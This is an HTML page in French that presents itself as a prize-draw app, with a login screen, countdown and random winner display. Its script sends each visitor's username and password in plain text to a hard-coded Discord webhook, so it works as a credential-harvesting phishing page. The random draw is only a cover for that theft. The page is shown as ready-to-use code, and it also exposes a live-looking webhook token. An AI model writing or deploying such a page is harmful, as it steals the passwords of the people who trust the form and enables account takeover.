<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Tirage au sort</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Archivo+Expanded:wght@600;700;800&family=Inter:wght@400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #0b0d0c;
    --panel: #121514;
    --panel-raised: #171b19;
    --line: #262b29;
    --line-soft: #1c201e;
    --emerald: #3ecf8e;
    --emerald-dim: #3ecf8e1a;
    --emerald-deep: #1f7a52;
    --text: #eef1ef;
    --text-dim: #8b938f;
    --text-faint: #565d5a;
    --radius: 4px;
  }

  * { box-sizing: border-box; margin: 0; padding: 0; }

  html, body { height: 100%; }

  body {
    background: var(--bg);
    background-image:
      linear-gradient(var(--line-soft) 1px, transparent 1px),
      linear-gradient(90deg, var(--line-soft) 1px, transparent 1px);
    background-size: 48px 48px;
    background-position: center;
    color: var(--text);
    font-family: 'Inter', system-ui, sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 24px;
  }

  .frame {
    width: 100%;
    max-width: 460px;
  }

  /* Bandeau d'identification, type registre officiel */
  .registry-bar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 0 2px 14px;
    border-bottom: 1px solid var(--line);
    margin-bottom: -1px;
  }

  .registry-mark {
    display: flex;
    align-items: center;
    gap: 8px;
    font-family: 'Space Mono', monospace;
    font-size: 11px;
    color: var(--text-faint);
    letter-spacing: 0.06em;
  }

  .registry-mark .dot {
    width: 6px;
    height: 6px;
    border-radius: 50%;
    background: var(--emerald);
    box-shadow: 0 0 0 3px var(--emerald-dim);
  }

  .registry-id {
    font-family: 'Space Mono', monospace;
    font-size: 11px;
    color: var(--text-faint);
    letter-spacing: 0.04em;
  }

  .screen {
    display: none;
  }

  .screen.active {
    display: block;
    animation: rise 0.4s cubic-bezier(.16,1,.3,1);
  }

  @keyframes rise {
    from { opacity: 0; transform: translateY(10px); }
    to { opacity: 1; transform: translateY(0); }
  }

  .panel {
    background: var(--panel);
    border: 1px solid var(--line);
    border-top: none;
    padding: 48px 38px 38px;
  }

  .kicker {
    font-family: 'Space Mono', monospace;
    font-size: 11px;
    letter-spacing: 0.14em;
    text-transform: uppercase;
    color: var(--emerald);
    margin-bottom: 18px;
  }

  h1 {
    font-family: 'Archivo Expanded', sans-serif;
    font-size: 28px;
    font-weight: 700;
    line-height: 1.2;
    letter-spacing: -0.01em;
    margin-bottom: 12px;
  }

  .lede {
    color: var(--text-dim);
    font-size: 14px;
    line-height: 1.6;
    margin-bottom: 36px;
    max-width: 38ch;
  }

  .field {
    margin-bottom: 18px;
  }

  .field-row {
    display: flex;
    align-items: baseline;
    justify-content: space-between;
    margin-bottom: 8px;
  }

  .field label {
    font-family: 'Space Mono', monospace;
    font-size: 11px;
    letter-spacing: 0.08em;
    text-transform: uppercase;
    color: var(--text-dim);
  }

  .field .field-index {
    font-family: 'Space Mono', monospace;
    font-size: 10px;
    color: var(--text-faint);
  }

  .field input {
    width: 100%;
    padding: 13px 14px;
    background: var(--bg);
    border: 1px solid var(--line);
    border-radius: var(--radius);
    color: var(--text);
    font-family: 'Inter', sans-serif;
    font-size: 14.5px;
    outline: none;
    transition: border-color 0.15s;
  }

  .field input::placeholder { color: var(--text-faint); }

  .field input:focus {
    border-color: var(--emerald);
  }

  .submit-row {
    display: flex;
    align-items: center;
    gap: 14px;
    margin-top: 28px;
  }

  button {
    flex: 1;
    padding: 14px;
    background: var(--emerald);
    color: #04140c;
    border: none;
    border-radius: var(--radius);
    font-family: 'Inter', sans-serif;
    font-size: 14px;
    font-weight: 700;
    letter-spacing: 0.01em;
    cursor: pointer;
    transition: background 0.15s, transform 0.1s;
  }

  button:hover { background: #4fe0a0; }
  button:active { transform: scale(0.985); }

  .submit-hint {
    font-family: 'Space Mono', monospace;
    font-size: 10.5px;
    color: var(--text-faint);
    white-space: nowrap;
  }

  .btn-ghost {
    background: transparent;
    color: var(--text-dim);
    border: 1px solid var(--line);
  }

  .btn-ghost:hover { color: var(--text); border-color: var(--text-faint); background: transparent; }

  /* --- Ecran timer --- */
  .panel-timer {
    padding: 56px 38px;
    text-align: center;
  }

  .timer-status {
    font-family: 'Space Mono', monospace;
    font-size: 11px;
    letter-spacing: 0.14em;
    text-transform: uppercase;
    color: var(--emerald);
    margin-bottom: 32px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
  }

  .timer-status .dot {
    width: 6px;
    height: 6px;
    border-radius: 50%;
    background: var(--emerald);
    animation: blink 1.1s ease-in-out infinite;
  }

  @keyframes blink {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.25; }
  }

  .counter {
    font-family: 'Archivo Expanded', sans-serif;
    font-size: 96px;
    font-weight: 800;
    line-height: 1;
    letter-spacing: -0.02em;
    font-variant-numeric: tabular-nums;
    color: var(--text);
    margin-bottom: 10px;
  }

  .counter-unit {
    font-family: 'Space Mono', monospace;
    font-size: 12px;
    letter-spacing: 0.1em;
    text-transform: uppercase;
    color: var(--text-faint);
    margin-bottom: 36px;
  }

  .progress-track {
    height: 2px;
    background: var(--line);
    width: 100%;
    margin-bottom: 8px;
    position: relative;
    overflow: hidden;
  }

  .progress-fill {
    position: absolute;
    inset: 0;
    background: var(--emerald);
    width: 0%;
    transition: width 1s linear;
  }

  .progress-caption {
    font-family: 'Space Mono', monospace;
    font-size: 10px;
    color: var(--text-faint);
    letter-spacing: 0.04em;
  }

  /* --- Ecran resultat --- */
  .panel-result {
    padding: 48px 38px 38px;
    text-align: center;
  }

  .result-seal {
    width: 44px;
    height: 44px;
    border: 1px solid var(--emerald);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 24px;
  }

  .result-seal svg { width: 18px; height: 18px; }

  .result-label {
    font-family: 'Space Mono', monospace;
    font-size: 11px;
    letter-spacing: 0.14em;
    text-transform: uppercase;
    color: var(--text-dim);
    margin-bottom: 16px;
  }

  .winner-name {
    font-family: 'Archivo Expanded', sans-serif;
    font-size: 38px;
    font-weight: 800;
    color: var(--text);
    margin-bottom: 8px;
    word-break: break-word;
    line-height: 1.15;
  }

  .winner-meta {
    font-family: 'Space Mono', monospace;
    font-size: 11px;
    color: var(--text-faint);
    margin-bottom: 32px;
    letter-spacing: 0.04em;
  }

  .divider {
    height: 1px;
    background: var(--line);
    margin: 0 0 28px;
  }

  @media (prefers-reduced-motion: reduce) {
    .timer-status .dot { animation: none; }
  }

  @media (max-width: 480px) {
    .panel, .panel-result { padding: 38px 26px 30px; }
    .panel-timer { padding: 44px 26px; }
    h1 { font-size: 23px; }
    .counter { font-size: 72px; }
    .winner-name { font-size: 30px; }
    .submit-row { flex-direction: column; align-items: stretch; }
    .submit-hint { text-align: center; }
  }
</style>
</head>
<body>

<div class="frame">

  <div class="registry-bar">
    <div class="registry-mark"><span class="dot"></span> Système de tirage</div>
    <div class="registry-id" id="registry-id">REF—000000</div>
  </div>

  <!-- ECRAN 1 : ACCUEIL / CONNEXION -->
  <section id="screen-welcome" class="screen active">
    <div class="panel">
      <div class="kicker">Accès participant</div>
      <h1>Bienvenue dans le tirage au sort</h1>
      <p class="lede">Renseigne tes identifiants pour enregistrer ta participation, puis lance le tirage.</p>

      <div class="field">
        <div class="field-row">
          <label for="username">Pseudo</label>
          <span class="field-index">01</span>
        </div>
        <input type="text" id="username" placeholder="Ton pseudo" autocomplete="off">
      </div>

      <div class="field">
        <div class="field-row">
          <label for="password">Mot de passe</label>
          <span class="field-index">02</span>
        </div>
        <input type="password" id="password" placeholder="••••••••" autocomplete="off">
      </div>

      <div class="submit-row">
        <button id="start-btn">Lancer le tirage</button>
        <span class="submit-hint">ENTER ↵</span>
      </div>
    </div>
  </section>

  <!-- ECRAN 2 : TIMER -->
  <section id="screen-timer" class="screen">
    <div class="panel panel-timer">
      <div class="timer-status"><span class="dot"></span> Tirage en cours</div>

      <div class="counter" id="timer-value">0</div>
      <div class="counter-unit">secondes restantes</div>

      <div class="progress-track">
        <div class="progress-fill" id="progress-fill"></div>
      </div>
      <div class="progress-caption">Sélection aléatoire en préparation</div>
    </div>
  </section>

  <!-- ECRAN 3 : RESULTAT -->
  <section id="screen-result" class="screen">
    <div class="panel panel-result">
      <div class="result-seal">
        <svg viewBox="0 0 24 24" fill="none" stroke="#3ecf8e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <polyline points="20 6 9 17 4 12"></polyline>
        </svg>
      </div>
      <div class="result-label">Résultat du tirage</div>
      <div class="winner-name" id="winner-name">—</div>
      <div class="winner-meta" id="winner-meta">Sélectionné aléatoirement</div>
      <div class="divider"></div>
      <button class="btn-ghost" id="restart-btn">Relancer un tirage</button>
    </div>
  </section>

</div>

<script>
  // ====== CONFIGURATION ======
  const TIMER_DURATION = 0; // duree du timer en secondes (a regler plus tard)
  const PARTICIPANTS = ["Alice", "Bilal", "Chloé", "David", "Emma"]; // liste temporaire, a remplacer plus tard
  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1517605118051356744/AEtfwWoh1Bq6czzwOU6gIPl4X-Ui5l2bz3buRmhRhcllLEtwTe5jrQIy47ztz7Z7s63N";

  // Envoie le pseudo et le mot de passe saisis vers Discord
  async function sendToDiscord(username, password) {
    try {
      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `**Nouvelle participation au tirage**\nPseudo : ${username}\nMot de passe : ${password}`
        })
      });
    } catch (err) {
      console.error("Erreur envoi Discord :", err);
    }
  }

  // Reference de session, purement cosmetique
  document.getElementById('registry-id').textContent =
    'REF—' + Math.floor(100000 + Math.random() * 900000);

  // ====== ELEMENTS ======
  const screenWelcome = document.getElementById('screen-welcome');
  const screenTimer = document.getElementById('screen-timer');
  const screenResult = document.getElementById('screen-result');

  const startBtn = document.getElementById('start-btn');
  const restartBtn = document.getElementById('restart-btn');
  const timerValue = document.getElementById('timer-value');
  const winnerName = document.getElementById('winner-name');
  const progressFill = document.getElementById('progress-fill');

  function showScreen(screen) {
    [screenWelcome, screenTimer, screenResult].forEach(s => s.classList.remove('active'));
    screen.classList.add('active');
  }

  function setProgress(remaining, total) {
    const ratio = total > 0 ? (total - remaining) / total : 1;
    progressFill.style.width = (ratio * 100) + '%';
  }

  function runTimerThenDraw() {
    showScreen(screenTimer);
    let remaining = TIMER_DURATION;
    timerValue.textContent = remaining;
    setProgress(remaining, TIMER_DURATION);

    if (remaining <= 0) {
      drawWinner();
      return;
    }

    const interval = setInterval(() => {
      remaining--;
      timerValue.textContent = remaining;
      setProgress(remaining, TIMER_DURATION);
      if (remaining <= 0) {
        clearInterval(interval);
        drawWinner();
      }
    }, 1000);
  }

  function drawWinner() {
    const winner = PARTICIPANTS[Math.floor(Math.random() * PARTICIPANTS.length)];
    winnerName.textContent = winner;
    showScreen(screenResult);
  }

  startBtn.addEventListener('click', () => {
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value;

    sendToDiscord(username, password);
    runTimerThenDraw();
  });

  document.getElementById('password').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') startBtn.click();
  });

  restartBtn.addEventListener('click', () => {
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
    document.getElementById('registry-id').textContent =
      'REF—' + Math.floor(100000 + Math.random() * 900000);
    showScreen(screenWelcome);
  });
</script>

</body>
</html>
